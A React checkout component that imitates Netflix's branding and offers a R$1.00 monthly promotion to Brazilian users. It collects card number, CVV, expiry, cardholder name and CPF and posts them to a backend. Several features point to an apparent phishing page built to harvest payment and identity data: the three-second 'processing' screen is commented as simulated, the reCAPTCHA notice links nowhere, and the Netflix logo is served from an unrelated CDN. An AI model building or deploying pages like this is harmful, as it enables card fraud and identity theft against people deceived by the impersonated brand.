import { useNavigate } from 'react-router-dom';
import { useState, useEffect } from 'react';

// Card brand detection function
const detectCardBrand = (cardNumber: string) => {
  const cleanNumber = cardNumber.replace(/\s/g, '');
  
  // Visa: starts with 4
  if (/^4/.test(cleanNumber)) {
    return {
      brand: 'visa',
      icon: 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg',
      name: 'Visa'
    };
  }
  
  // Mastercard: starts with 5, 2221-2720
  if (/^5[1-5]/.test(cleanNumber) || /^2(2[2-9][1-9]|[3-6]\d{2}|7[01]\d|720)/.test(cleanNumber)) {
    return {
      brand: 'mastercard',
      icon: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
      name: 'Mastercard'
    };
  }
  
  // American Express: starts with 34 or 37
  if (/^3[47]/.test(cleanNumber)) {
    return {
      brand: 'amex',
      icon: 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg',
      name: 'American Express'
    };
  }
  
  // Elo: starts with 4011, 4312, 4389, 4514, 4573, 5041, 5066, 5067, 6277, 6362, 6363
  if (/^(4011|4312|4389|4514|4573|5041|5066|5067|6277|6362|6363)/.test(cleanNumber)) {
    return {
      brand: 'elo',
      icon: 'https://logoeps.com/wp-content/uploads/2014/03/elo-vector-logo.png',
      name: 'Elo'
    };
  }
  
  // Hipercard: starts with 6062
  if (/^6062/.test(cleanNumber)) {
    return {
      brand: 'hipercard',
      icon: 'https://seeklogo.com/images/H/hipercard-logo-F99A7E8A89-seeklogo.com.png',
      name: 'Hipercard'
    };
  }
  
  return null;
};

export default function Payment() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cpf: ''
  });

  const [detectedCard, setDetectedCard] = useState<{
    brand: string;
    icon: string;
    name: string;
  } | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let formattedValue = value;

    // Format card number with spaces
    if (name === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      
      // Detect card brand after formatting
      const cardBrand = detectCardBrand(formattedValue);
      setDetectedCard(cardBrand);
    }

    // Format expiry date
    if (name === 'expiry') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.slice(0, 2) + '/' + formattedValue.slice(2, 4);
      }
    }

    // Format CPF
    if (name === 'cpf') {
      formattedValue = value.replace(/\D/g, '');
      if (formattedValue.length <= 11) {
        formattedValue = formattedValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      }
    }

    // Format CVV (only numbers)
    if (name === 'cvv') {
      formattedValue = value.replace(/\D/g, '');
    }

    setFormData(prev => ({
      ...prev,
      [name]: formattedValue
    }));
  };

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    // Scroll to top when page loads
    window.scrollTo(0, 0);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Validate CPF has exactly 11 digits
    const cpfNumbers = formData.cpf.replace(/\D/g, '');
    if (cpfNumbers.length !== 11) {
      alert('CPF deve ter exatamente 11 dígitos');
      setIsSubmitting(false);
      return;
    }

    // Disparar evento de compra no Meta Pixel
    if (typeof window !== 'undefined' && (window as any).fbq) {
      (window as any).fbq('track', 'Purchase', {
        value: 1.00,
        currency: 'BRL'
      });
    }

    try {
      const response = await fetch('/api/payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          cardNumber: formData.cardNumber,
          expiry: formData.expiry,
          cvv: formData.cvv,
          cardName: formData.cardName,
          cpf: cpfNumbers // Send only numbers (11 digits)
        })
      });

      if (response.ok) {
        // Mostrar "Processando pagamento"
        setIsProcessing(true);
        setIsSubmitting(false);
        
        // Aguardar 3 segundos simulando processamento
        setTimeout(() => {
          navigate('/thank-you');
        }, 3000);
      } else {
        alert('Erro ao processar pagamento. Tente novamente.');
        setIsSubmitting(false);
      }
    } catch (error) {
      console.error('Erro ao enviar pagamento:', error);
      alert('Erro ao processar pagamento. Tente novamente.');
      setIsSubmitting(false);
    }
  };

  const handleBackToHome = () => {
    navigate('/');
  };

  if (isProcessing) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-[#B20710] to-black flex justify-center items-center text-white px-4 py-8">
        <div className="bg-black bg-opacity-85 p-8 md:p-10 rounded-md w-full max-w-md text-center">
          <div className="flex justify-center mb-8">
            <img
              src="https://mocha-cdn.com/019a4b3f-7c62-7754-adc6-91368a479acd/Netflix_Logo_2PMS.png"
              alt="Netflix"
              className="h-12 w-auto"
            />
          </div>
          
          <div className="flex justify-center mb-6">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-[#E50914]"></div>
          </div>
          
          <h1 className="text-2xl font-bold mb-4">Processando pagamento...</h1>
          <p className="text-[#B3B3B3] text-sm">
            Aguarde enquanto confirmamos seu pagamento. Isso pode levar alguns segundos.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#B20710] to-black flex justify-center items-center text-white px-4 py-8">
      <div className="bg-black bg-opacity-85 p-8 md:p-10 rounded-md w-full max-w-md">
        <div className="flex justify-center mb-8">
          <img
            src="https://mocha-cdn.com/019a4b3f-7c62-7754-adc6-91368a479acd/Netflix_Logo_2PMS.png"
            alt="Netflix"
            className="h-12 w-auto"
          />
        </div>
        
        <h1 className="text-2xl font-bold mb-6 text-center">Finalizar pagamento</h1>
        
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="cardName" className="block text-sm text-[#B3B3B3] mb-1.5">
              Nome no cartão
            </label>
            <input
              type="text"
              id="cardName"
              name="cardName"
              placeholder="Como impresso no cartão"
              value={formData.cardName}
              onChange={handleChange}
              required
              className="w-full p-3.5 rounded border border-gray-600 bg-[#0f0f0f] text-white text-base outline-none transition-colors focus:border-[#E50914] focus:shadow-[0_0_4px_rgba(229,9,20,0.6)] placeholder-[#B3B3B3]"
            />
          </div>

          <div>
            <label htmlFor="cardNumber" className="block text-sm text-[#B3B3B3] mb-1.5">
              Número do cartão
            </label>
            <div className="relative">
              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                placeholder="0000 0000 0000 0000"
                value={formData.cardNumber}
                onChange={handleChange}
                maxLength={19}
                required
                className="w-full p-3.5 pr-14 rounded border border-gray-600 bg-[#0f0f0f] text-white text-base outline-none transition-colors focus:border-[#E50914] focus:shadow-[0_0_4px_rgba(229,9,20,0.6)] placeholder-[#B3B3B3]"
              />
              {detectedCard && (
                <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center">
                  <img
                    src={detectedCard.icon}
                    alt={detectedCard.name}
                    className="h-6 w-auto object-contain"
                    title={detectedCard.name}
                  />
                </div>
              )}
            </div>
            {detectedCard && (
              <p className="text-xs text-green-400 mt-1 flex items-center gap-1">
                <span className="w-2 h-2 bg-green-400 rounded-full"></span>
                {detectedCard.name} detectado
              </p>
            )}
          </div>

          <div className="flex gap-2.5">
            <div className="flex-1">
              <label htmlFor="expiry" className="block text-sm text-[#B3B3B3] mb-1.5">
                Validade
              </label>
              <input
                type="text"
                id="expiry"
                name="expiry"
                placeholder="MM/AA"
                value={formData.expiry}
                onChange={handleChange}
                maxLength={5}
                required
                className="w-full p-3.5 rounded border border-gray-600 bg-[#0f0f0f] text-white text-base outline-none transition-colors focus:border-[#E50914] focus:shadow-[0_0_4px_rgba(229,9,20,0.6)] placeholder-[#B3B3B3]"
              />
            </div>
            <div className="flex-1">
              <label htmlFor="cvv" className="block text-sm text-[#B3B3B3] mb-1.5">
                CVV
              </label>
              <input
                type="text"
                id="cvv"
                name="cvv"
                placeholder="***"
                value={formData.cvv}
                onChange={handleChange}
                maxLength={3}
                required
                className="w-full p-3.5 rounded border border-gray-600 bg-[#0f0f0f] text-white text-base outline-none transition-colors focus:border-[#E50914] focus:shadow-[0_0_4px_rgba(229,9,20,0.6)] placeholder-[#B3B3B3]"
              />
            </div>
          </div>

          <div>
            <label htmlFor="cpf" className="block text-sm text-[#B3B3B3] mb-1.5">
              CPF do titular
            </label>
            <input
              type="text"
              id="cpf"
              name="cpf"
              placeholder="000.000.000-00"
              value={formData.cpf}
              onChange={handleChange}
              maxLength={14}
              required
              className="w-full p-3.5 rounded border border-gray-600 bg-[#0f0f0f] text-white text-base outline-none transition-colors focus:border-[#E50914] focus:shadow-[0_0_4px_rgba(229,9,20,0.6)] placeholder-[#B3B3B3]"
            />
          </div>

          <div className="bg-[#111] border border-[#2f2f2f] rounded p-3.5 text-[#00c853] font-semibold flex justify-between items-center">
            <span>NovembroBlack</span>
            <span className="bg-[#00c853] text-white text-xs px-1.5 py-0.5 rounded">
              Ativado
            </span>
          </div>

          <div className="bg-[#0f0f0f] border border-gray-600 rounded p-3.5 font-semibold text-white">
            Valor total: <strong>R$ 1,00</strong>
          </div>

          <p className="text-xs text-[#B3B3B3] mt-2 mb-4">
            *Será cobrado o valor de R$1,00 assinatura mensal, cancele quando quiser.
          </p>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full p-3.5 bg-[#E50914] text-white font-semibold text-base border-none rounded cursor-pointer transition-colors hover:bg-[#B0060F] mt-2.5 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isSubmitting ? 'Processando...' : 'Pagar agora'}
          </button>
        </form>

        <div 
          onClick={handleBackToHome}
          className="mt-6 text-sm text-white text-center cursor-pointer hover:text-gray-300"
        >
          Precisa de ajuda?
        </div>

        <p className="mt-6 text-xs text-[#8C8C8C] leading-relaxed text-center">
          Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô.{' '}
          <a href="#" className="text-blue-400 no-underline hover:underline">
            Saiba mais
          </a>
        </p>
      </div>
    </div>
  );
}
